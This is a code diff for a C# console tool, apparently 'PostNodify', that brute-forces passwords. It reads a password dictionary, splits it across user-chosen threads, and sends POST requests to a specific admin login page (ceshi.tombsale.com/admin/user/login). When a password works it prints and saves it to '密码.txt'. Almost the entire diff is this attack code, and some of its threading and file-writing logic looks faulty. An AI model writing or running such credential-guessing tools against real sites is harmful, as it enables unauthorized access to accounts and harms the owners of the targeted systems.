@@ -29,15 +29,27 @@ namespace PostNodify
             //        break;
             //    }
             //}
-
-            string[] line = File.ReadAllLines(@"C:\Users\hewei\Desktop\400W.txt");
-            var st = LoadTxtPost(line, "http://ceshi.tombsale.com/admin/user/login", 8);
-
-            foreach (var item in st)
+            SaveFile.ToTxt("我是密码", Directory.GetCurrentDirectory() + @"\密码.txt");
+            Console.WriteLine("hi 猛男");
+            Console.WriteLine("请输入文件夹路径:");
+            string path = Console.ReadLine();
+            string[] line = File.ReadAllLines(path);
+            Console.WriteLine("密码字典加载成功");
+            int taskcount;
+            while (true)
             {
-                Console.WriteLine(item);
+                Console.WriteLine("请输入线程数!");
+                string num = Console.ReadLine();
+                if (int.TryParse(num, out taskcount))
+                {
+                    break;
+                }
             }
-            //Console.WriteLine("post over");
+
+            var st = LoadTxtPost(line, "http://ceshi.tombsale.com/admin/user/login", taskcount);
+            Console.WriteLine("结束，这里有密码。");
+            Console.WriteLine("密码=================>" + st);
+            Console.WriteLine("post over");
             Console.ReadKey();
 
         }
@@ -69,46 +81,39 @@ namespace PostNodify
         {
             string retString = "";
 
-            try
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            request.CookieContainer = new CookieContainer();
+            CookieContainer cookie = request.CookieContainer;//如果用不到Cookie，删去即可  
+                                                             //以下是发送的http头，随便加，其中referer挺重要的，有些网站会根据这个来反盗链  
+            request.Referer = "http://ceshi.tombsale.com/admin/user/login";
+            request.Accept = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+            request.Headers["Accept-Language"] = "zh-CN,zh;q=0.";
+            request.Headers["Accept-Charset"] = "GBK,utf-8;q=0.7,*;q=0.3";
+            request.UserAgent = "User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1";
+            request.KeepAlive = true;
+            //上面的http头看情况而定，但是下面俩必须加  
+            request.ContentType = "application/x-www-form-urlencoded";
+            request.Method = "POST";
+
+            Encoding encoding = Encoding.UTF8;//根据网站的编码自定义  
+            byte[] postData = encoding.GetBytes(postDataStr);//postDataStr即为发送的数据，格式还是和上次说的一样  
+            request.ContentLength = postData.Length;
+            Stream requestStream = request.GetRequestStream();
+
+            requestStream.Write(postData, 0, postData.Length);
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream responseStream = response.GetResponseStream();
+            //如果http头中接受gzip的话，这里就要判断是否为有压缩，有的话，直接解压缩即可  
+            if (response.Headers["Content-Encoding"] != null && response.Headers["Content-Encoding"].ToLower().Contains("gzip"))
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-                request.CookieContainer = new CookieContainer();
-                CookieContainer cookie = request.CookieContainer;//如果用不到Cookie，删去即可  
-                                                                 //以下是发送的http头，随便加，其中referer挺重要的，有些网站会根据这个来反盗链  
-                request.Referer = "http://ceshi.tombsale.com/admin/user/login";
-                request.Accept = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-                request.Headers["Accept-Language"] = "zh-CN,zh;q=0.";
-                request.Headers["Accept-Charset"] = "GBK,utf-8;q=0.7,*;q=0.3";
-                request.UserAgent = "User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1";
-                request.KeepAlive = true;
-                //上面的http头看情况而定，但是下面俩必须加  
-                request.ContentType = "application/x-www-form-urlencoded";
-                request.Method = "POST";
-
-                Encoding encoding = Encoding.UTF8;//根据网站的编码自定义  
-                byte[] postData = encoding.GetBytes(postDataStr);//postDataStr即为发送的数据，格式还是和上次说的一样  
-                request.ContentLength = postData.Length;
-                Stream requestStream = request.GetRequestStream();
-
-                requestStream.Write(postData, 0, postData.Length);
-                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-                Stream responseStream = response.GetResponseStream();
-                //如果http头中接受gzip的话，这里就要判断是否为有压缩，有的话，直接解压缩即可  
-                if (response.Headers["Content-Encoding"] != null && response.Headers["Content-Encoding"].ToLower().Contains("gzip"))
-                {
-                    responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
-                }
-
-                StreamReader streamReader = new StreamReader(responseStream, encoding);
-                retString = streamReader.ReadToEnd();
-
-                streamReader.Close();
-                responseStream.Close();
+                responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
             }
-            catch (Exception)
-            {
-            }
-            
+
+            StreamReader streamReader = new StreamReader(responseStream, encoding);
+            retString = streamReader.ReadToEnd();
+
+            streamReader.Close();
+            responseStream.Close();
             return retString;
         }
 
@@ -127,25 +132,67 @@ namespace PostNodify
             return "";
 
         }
-        public static List<string> LoadTxtPost(string[] line, string url, int tasknum)
+        public static string LoadTxtPost(string[] line, string url, int tasknum)
         {
-            List<string> pws = new List<string>();
+            string pws = "";
             int count = line.Length / tasknum;
             int yu = line.Length % tasknum;
+            Task[] tasks = new Task[tasknum];
             for (int i = 0; i < tasknum; i++)
             {
                 var l = line.Skip(count * i).Take(count).ToArray();
-                Task.Run(() =>
+                tasks[i] = Task.Factory.StartNew(() =>
                 {
-                    string paw = "";
-                    paw = PostArray(l, i);
-                    if (paw != "")
+                    string pw = PostArray(l, i);
+                    if (pw != "")
                     {
-                        pws.Add(paw);
+                        pws = pw;
+                        SaveFile.ToTxt(Directory.GetCurrentDirectory() + "密码.txt", pws);
+                        foreach (var item in tasks)
+                        {
+                            item.Dispose();
+                        }
                     }
                 });
             }
+            try
+            {
+                Task.WaitAll(tasks);
+            }
+            catch (AggregateException ae)
+            {
+                Console.WriteLine(ae.Message);
+                SaveFile.ToTxt(ae.Message, Directory.GetCurrentDirectory() + @"\异常.txt");
+                throw ae.Flatten();
+            }
+
             return pws;
+        }
+
+        public static void LoadFilesPost(string path)
+        {
+            var files = Directory.GetFiles(path).ToList();
+            Task[] tasks = new Task[4];
+            for (int i = 0; i < files.Count; i = i + 4)
+            {
+                tasks[0] = Task.Factory.StartNew(() =>
+                 {
+
+                 });
+                tasks[1] = Task.Factory.StartNew(() =>
+                  {
+
+                  });
+                tasks[2] = Task.Factory.StartNew(() =>
+                 {
+
+                 });
+                tasks[3] = Task.Factory.StartNew(() =>
+                 {
+
+                 });
+            }
+
         }
     }
 
